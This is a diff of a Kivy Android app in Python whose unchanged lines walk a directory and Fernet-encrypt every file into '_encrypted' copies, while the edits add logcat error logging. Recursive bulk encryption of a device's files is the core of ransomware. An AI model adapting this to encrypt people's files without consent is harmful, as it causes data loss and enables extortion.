@@ -4,6 +4,8 @@ from kivy.uix.label import Label
 from kivy.uix.button import Button
 from cryptography.fernet import Fernet
 import os
+from jnius import autoclass
+
 
 class MainApp(App):
     def build(self):
@@ -40,7 +42,7 @@ class MainApp(App):
             for root, _, files in os.walk(directory):
                 for file in files:
                     file_path = os.path.join(root, file)
-                    encrypted_file = file_path + "_encrypted"  # Appending "_encrypted" to the original filename
+                    encrypted_file = file_path + "_encrypted" 
                     encrypt_file(file_path, encrypted_file)
 
         try:
@@ -49,6 +51,9 @@ class MainApp(App):
 
         except FileNotFoundError as e:
             print(f"Error: {e}")
+            # Print to logcat
+            Log = autoclass('android.util.Log')
+            Log.e('Python', f'Error: {e}')
 
 if __name__ == '__main__':
     MainApp().run()
